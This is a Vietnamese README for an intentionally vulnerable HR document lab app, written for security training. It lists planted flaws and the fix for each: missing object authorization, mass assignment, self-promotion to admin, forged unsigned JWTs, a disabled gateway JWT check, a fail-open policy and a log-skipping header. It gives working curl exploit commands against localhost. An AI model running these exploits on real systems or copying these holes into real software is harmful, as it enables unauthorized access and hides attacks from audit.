# Danh mục lỗ hổng cố ý – BẢN VULNERABLE (stack FastAPI · Keycloak · OPA · Kong · Loki/Grafana)

> ⚠️ Bản này **cố tình** chứa lỗ hổng để huấn luyện/kiểm thử bảo mật. **Chỉ chạy trong lab**,
> không bao giờ expose ra Internet hay dùng cho dữ liệu thật. Bản vá tương ứng (phân quyền đúng
> chuẩn) nằm ở `../hr-docs-app-iam-stack/`.

So với bản secure, bản này chỉ bị sửa ở **5 file**, mỗi chỗ đánh dấu bằng comment `V-...` để dễ tra
`file:line`:

| File | Lỗ hổng |
|---|---|
| `api/app/security.py` | V-JWT-1, V-JWT-2, V-JWT-3 (xác thực JWT) |
| `api/app/routers/documents.py` | V-BOLA-1, V-BOLA-2, V-MASS-1 |
| `api/app/routers/employees.py` | V-BOLA-3, V-PRIVESC-1, V-MASS-2 |
| `api/app/request_log.py` | V-LOG-1 (che giấu dấu vết) |
| `policies/opa/hrdocs/authz.rego` | V-OPA-1 (R5), V-OPA-2 (fail-open), V-OPA-3 (R6) |
| `kong/kong.template.yml` | V-KONG-1, V-KONG-2, V-KONG-3 (gateway) |

Tài khoản mẫu (mật khẩu chung `Password123!`, đăng nhập bằng username/email `…@corp.local`):
`admin`, `it.manager`, `alice`, `bob`, `hr.manager`, `carol`, `sales.manager`, `dave`.
Alice/Bob là employee phòng IT.

**Chạy minh họa tự động:**
```bash
docker compose up -d --build
docker compose run --rm api python -m app.seed
python scripts/exploit.py          # 8/8 "KHAI THÁC OK"
```
`python scripts/check_authz.py` (ma trận quyền của bản secure) trên bản này cho **26 dòng FAIL**;
`opa test policies/opa` cho **4/26 FAIL** — trên bản secure tất cả đều PASS.

---

## 1. BOLA / IDOR (Broken Object Level Authorization)

| Mã | Vị trí | Lỗi | Khai thác |
|---|---|---|---|
| V-BOLA-1 | `routers/documents.py:64` (`get_document`) | Bỏ `authorize('document:read')` → mất R1 (owner), R2 (manager cùng phòng), R3 (giờ làm việc). | Employee bất kỳ đọc **mọi** tài liệu theo id, kể cả `confidential` của phòng khác, bất kể giờ. |
| V-BOLA-2 | `routers/documents.py:74` (`update_document`) | Bỏ `authorize('document:update')` → mất R1. | Employee sửa/ghi đè tài liệu của người khác chỉ cần biết id. |
| V-BOLA-3 | `routers/employees.py:44` (`get_employee`) | Bỏ `authorize('employee:read')`. | Employee đọc hồ sơ đầy đủ người khác, **gồm cả `salary`**. |

```bash
TOKEN=$(curl -s localhost:8080/realms/hrdocs/protocol/openid-connect/token \
  -d grant_type=password -d client_id=hrdocs-cli -d username=alice -d password='Password123!' \
  | python -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
curl -s localhost:8000/api/documents/<id_tài_liệu_người_khác> -H "Authorization: Bearer $TOKEN"
curl -s localhost:8000/api/employees/<id_nhân_viên_khác>      -H "Authorization: Bearer $TOKEN"  # thấy salary
```
**Vá:** gọi `authorize(request, p, 'document:read'|'document:update'|'employee:read', resource, …)` trước khi
trả dữ liệu, để OPA áp R1/R2/R3 và EMP_SELF/EMP_DEPT_MANAGER (đúng như bản secure).

---

## 2. Mass assignment / tin dữ liệu client gửi

| Mã | Vị trí | Lỗi | Khai thác |
|---|---|---|---|
| V-MASS-1 | `routers/documents.py:50` (`create_document`) | Lấy `owner_id`/`department` từ body thay vì từ token. | Tạo tài liệu "thuộc về" người khác, giả mạo nguồn gốc dữ liệu. |
| V-MASS-2 | `routers/employees.py:54` (`patch_employee`) | Ghi thẳng mọi trường trong body vào Mongo, bỏ allowlist `EmployeePatch`. | Sửa trường ngoài ý định (kết hợp với V-PRIVESC-1). |

```bash
curl -s -X POST localhost:8000/api/documents -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"title":"giả mạo","content":"x","classification":"internal","owner_id":"<id_nạn_nhân>","department":"HR"}'
```
**Vá:** `owner_id = p.id`, `department_id = p.department` (không đọc từ body); parse body qua Pydantic model
có `extra="forbid"` và allowlist trường theo vai trò.

---

## 3. Leo thang đặc quyền (Privilege Escalation)

| Mã | Vị trí | Lỗi | Khai thác |
|---|---|---|---|
| V-PRIVESC-1 | `routers/employees.py:53` (`patch_employee`) | Bỏ `authorize('employee:update')` → mất R4 (không ai tự sửa role/salary) và kiểm tra bản thân/admin. | Employee tự PATCH chính mình `{"role":"admin","salary":999999999}` → thành admin, tự tăng lương. |
| V-OPA-1 | `policies/opa/hrdocs/authz.rego:88` (`internal_ip`) | `internal_ip` luôn `true` → mất R5. | Xóa tài liệu và thao tác `/admin/*` chạy được từ **bất kỳ IP nào**. |
| V-OPA-3 | `policies/opa/hrdocs/authz.rego:206` (`department_report`) | Cho mọi manager, bỏ điều kiện đúng phòng ban → mất R6. | IT manager xem báo cáo (lương toàn phòng) của HR, SALES. |

```bash
ALICE_ID=$(curl -s localhost:8000/api/auth/me -H "Authorization: Bearer $TOKEN" | python -c "import sys,json;print(json.load(sys.stdin)['_id'])")
curl -s -X PATCH localhost:8000/api/employees/$ALICE_ID -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"role":"admin","salary":999999999}'
# Lần đăng nhập sau, token của alice mang role=admin (API đồng bộ cả sang Keycloak).
```
**Vá:** khôi phục `authorize('employee:update', fields=…)` + allowlist (self chỉ sửa `fullName/phone/address`);
trong rego giữ `internal_ip` kiểm `cfg.internal_cidrs` (R5) và `department_report` kiểm
`input.resource.manager_id == input.subject.id` (R6).

---

## 4. Xác thực & giả mạo JWT (`api/app/security.py`)

| Mã | Vị trí | Lỗi | Khai thác |
|---|---|---|---|
| V-JWT-1 | `security.py:33` (`decode_token`) | `verify_signature=False`, chấp nhận `alg:none`, không kiểm `aud`/`iss`/`exp`. | Tự tạo token không ký với `sub`/`role` tùy ý, không cần khóa Keycloak. |
| V-JWT-2 | `security.py:55` (`principal_from_claims`) | Tin claim `role` phẳng và header `X-Role`/`X-Department` do client gửi, ghi đè realm role thật. | Token (giả hoặc thật) + `X-Role: admin` → được coi là admin. |
| V-JWT-3 | `security.py:87` (`current_principal`) | Bỏ kiểm tra `isActive`. | Tài khoản đã bị khóa vẫn dùng token cũ được. |

Giả mạo hoàn toàn bằng token `alg:none` (không chữ ký):
```bash
b64() { printf "%s" "$1" | base64 | tr '+/' '-_' | tr -d '='; }
H=$(b64 '{"alg":"none","typ":"JWT"}')
P=$(b64 '{"sub":"a0000000-0000-4000-8000-000000000001","role":"admin"}')
FORGED="$H.$P."
curl -s -X POST localhost:8000/api/admin/users -H "Authorization: Bearer $FORGED" \
  -H 'Content-Type: application/json' \
  -d '{"email":"intruder@corp.local","password":"Password123!","fullName":"Intruder","department":"IT"}'
curl -s localhost:8000/api/admin/audit -H "Authorization: Bearer $FORGED"
```
Hoặc giữ token thật của alice nhưng thêm header `-H "X-Role: admin"` để leo quyền ngay trong phiên.

**Vá:** `jwt.decode(token, signing_key, algorithms=['RS256'], audience=…, issuer=…, require exp/iat/iss/aud/sub)`;
chỉ lấy role từ `realm_access.roles`, department từ claim group; kiểm `employees.isActive`. Đây đúng là
`security.py` của bản secure.

---

## 5. API Gateway yếu (`kong/kong.template.yml`)

| Mã | Vị trí | Lỗi | Khai thác |
|---|---|---|---|
| V-KONG-1 | `kong.template.yml:20` (plugin `jwt`) | `enabled: false` → Kong **không** kiểm chữ ký/exp nữa, dồn hết cho API đã hỏng. | Token giả/hết hạn đi thẳng qua gateway. |
| V-KONG-2 | `kong.template.yml:22` | Dù bật lại, `claims_to_verify: []` (bỏ `exp`). | Token hết hạn vẫn được chấp nhận. |
| V-KONG-3 | `kong.template.yml:37,45` | Gỡ plugin `ip-restriction` khỏi route `/api/admin` và DELETE tài liệu. | Mất lớp R5 thứ hai ở gateway (trùng hướng với V-OPA-1). |

**Vá:** bật plugin `jwt` (`enabled: true`, `claims_to_verify: [exp]`, `maximum_expiration: 3600`), gắn lại
`ip-restriction` cho route admin và DELETE.

---

## 6. Policy engine fail-open & che giấu dấu vết

| Mã | Vị trí | Lỗi | Khai thác |
|---|---|---|---|
| V-OPA-2 | `policies/opa/hrdocs/authz.rego:107` | `default decision := {"allow": true, …}` (fail-open). | Action lạ hoặc input thiếu field → OPA **cho phép**. Mất nguyên tắc từ chối mặc định. |
| V-LOG-1 | `request_log.py:51` (`request_log_middleware`) | Request có header `X-Debug-Skip-Log` thì **không** ghi audit log. | Kẻ tấn công thêm header này để hành vi khai thác không để lại vết trong `audit_logs`/Loki. |

```bash
# Đọc trộm tài liệu mà không để lại log
curl -s localhost:8000/api/documents/<id> -H "Authorization: Bearer $TOKEN" -H "X-Debug-Skip-Log: 1"
```
**Vá:** `default decision := {"allow": false, "rule": "DEFAULT_DENY"}` (fail-closed); bỏ lối tắt
`X-Debug-Skip-Log` — mọi request `/api/*` đều sinh đúng một bản ghi log.

---

## Đối chiếu nhanh

- 6 quy tắc ABAC (R1–R6) vẫn còn **định nghĩa** trong `authz.rego`, nhưng các route BOLA **không gọi** OPA
  nữa (thay bằng `record(..., "NO_CHECK")` để vẫn có log), còn R5/R6 bị gỡ ngay trong policy.
- Vì vậy `python scripts/check_authz.py` cho nhiều dòng **FAIL** và `opa test policies/opa` cho **4 FAIL**
  — trên bản secure tất cả đều **PASS**.
- Dùng Grafana (dashboard "HR Docs – AuthZ & Access Logs") để thấy các request `decision=allow`,
  `policy_rule=NO_CHECK`/`DEFAULT_ALLOW` — dấu hiệu phân quyền đã bị vô hiệu.

## Gợi ý bài thực hành

1. So `security.py`, hai router, `authz.rego`, `kong.template.yml` của bản vuln với bản secure (ví dụ
   `diff -ru ../hr-docs-app-iam-stack/api/app ../hr-docs-app-iam-stack-vulnerable/api/app`) để thấy đúng
   những dòng bị làm yếu.
2. Khai thác từng lỗ hổng bằng Burp/curl, quan sát log trong Grafana.
3. Vá lần lượt cho tới khi `check_authz.py` và `opa test` trở lại 100% PASS — khi đó bản vuln đã bằng bản secure.
